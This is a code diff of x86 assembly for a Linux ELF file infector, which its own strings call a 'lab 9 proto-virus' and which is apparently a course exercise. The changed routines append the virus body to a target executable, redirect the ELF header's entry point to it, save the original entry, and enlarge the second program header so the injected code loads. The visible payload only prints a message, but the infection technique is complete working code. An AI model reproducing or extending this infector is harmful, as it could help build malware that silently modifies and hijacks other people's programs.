@@ -73,58 +73,68 @@ main:
 	jl Error
 	mov [ebp-4], eax ; ebp-4 => file descriptor
 
-infection:
-	append:
-		lseek [ebp-4], 0, SEEK_END
-		mov [ebp - 8], eax ; ebp-8 => file size
-		mov eax, virus_end
-		call get_my_loc
-		sub ecx, next_i-_start
-		sub eax, ecx
-		mov [ebp - 70], eax
-		write [ebp-4], ecx, eax
+append:
+	lseek [ebp-4], 0, SEEK_END
+	mov [ebp-8], eax ; ebp-8 => file size
+	mov eax, virus_end
+	call get_my_loc
+	sub ecx, next_i-_start
+	sub eax, ecx ; virus size
+	mov [ebp-68], eax
+	write [ebp-4], ecx, eax
+	mov ebx, [ebp-8] ; file size
+	add eax, ebx ; file+virus
+	mov [ebp - 70], eax
 
+;elf header size = 52
 ;ebp-4 = fd
 ;ebp-8 = filesize
-;ebp-60 = 1st header
+;ebp-60 = elf header
 ;ebp-64 = original entry
+;ebp-68 = virus size
 ;ebp-70 = file+virus size
+;ebp-102 = 2nd program header
 
-	changeEntry:
-		lseek [ebp-4], 0, SEEK_SET
-		mov eax, ebp
-		sub eax, 8 + 52 ; place in stack for 52 byte header -8-52
-		read [ebp-4], eax, 52
-		mov ebx, [ebp - 8 - 52 + ENTRY]
-		mov [ebp - 8 - 52 - 4], ebx ; place for our original entry
-		mov eax, entry_ptr
-		add eax, [ebp-8] ; adress of entry point + file size = virus
-		mov [ebp - 8 - 52 + ENTRY], eax ; change entry
-		lseek [ebp-4], 0, SEEK_SET
-		mov ebx, ebp
-		sub ebx, 60
-		write [ebp-4], ebx, 52
+changeEntry:
+	lseek [ebp-4], 0, SEEK_SET
+	mov eax, ebp
+	sub eax, 60 ; place in stack for 52 byte header -60
+	read [ebp-4], eax, 52 ; write to memory elfhdr
+	mov ebx, [ebp - 60 + ENTRY] ; original entry
+	mov dword [ebp - 64], ebx ; place for our original entry
+	mov eax, [ebp - 60 + PHDR_start] ; phdr offset
+	add eax, PHDR_size ; second phdr
+	lseek [ebp-4], 0, SEEK_SET ; rewind
+	lseek [ebp-4], eax, SEEK_SET ; file second phdr
+	mov eax, ebp
+	sub eax, 102 ; memory phdr
+	read [ebp - 4], eax, PHDR_size ; read phdr to memory
+	mov eax, [ebp - 102 + PHDR_vaddr]
+	sub eax, [ebp - 102 + PHDR_offset] ; second program entry = vaddr - offset
+	add eax, [ebp-8] ; entry point + file size = virus
+	mov dword [ebp - 60 + ENTRY], eax ; change entry
+	lseek [ebp-4], 0, SEEK_SET ; start of file
+	mov ebx, ebp
+	sub ebx, 60
+	write [ebp-4], ebx, 52 ; copy new elf header
 
-;ebp-40 = 2nd header
-writePrevioudEntry:
-		lseek [ebp-4], -4, SEEK_END
-		mov ebx, ebp
-		sub ebx, 64
-		write [ebp-4], ebx, 4
-		lseek [ebp-4], 52, SEEK_SET
-		mov ebx,ebp
-		sub ebx, 40
-		read [ebp-4], ebx, 32
-		mov eax, [ebp-8]
-		add eax, [ebp-70]
-		sub eax, [ebp - 40 + PHDR_offset]
-		mov [ebp - 40 + PHDR_filesize], eax
-		mov [ebp - 40 + PHDR_memsize], eax
-		lseek [ebp-4], 52, SEEK_SET
-		mov ebx,ebp
-		sub ebx, 40
-		write [ebp-4], ebx, 32
-		close [ebp-4]
+writePreviousEntry:
+	lseek [ebp-4], -4, SEEK_END ; end of file -4
+	mov ebx, ebp
+	sub ebx, 64
+	write [ebp-4], ebx, 4 ; change original entry variable
+	mov eax, [ebp-70] ; file+virus
+	sub eax, [ebp - 102 + PHDR_offset]  ;file+virus-offset
+	mov [ebp - 102 + PHDR_memsize], eax
+	mov [ebp - 102 + PHDR_filesize], eax
+	mov eax, [ebp - 60 + PHDR_start] ; phdr offset
+	add eax, PHDR_size ; 2nd phdr offset
+	lseek [ebp-4], 0, SEEK_SET
+	lseek [ebp-4], eax, SEEK_SET ; 2nd phdr in file
+	mov eax, ebp
+	sub eax, 102
+	write [ebp-4], eax, PHDR_size
+	close [ebp-4]
 
 VirusExit:
 	   exit 0       ; Termination if all is OK and no previous code to jump to
@@ -135,7 +145,7 @@ Error:
 		add ecx, originalEntry-next_i
 		jmp [ecx]
 
-FileName:			db "ELFexec2short", 0
+FileName:			db "ELFexec2long", 0
 OutStr:				db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:        	db "perhaps not", 10 , 0
 
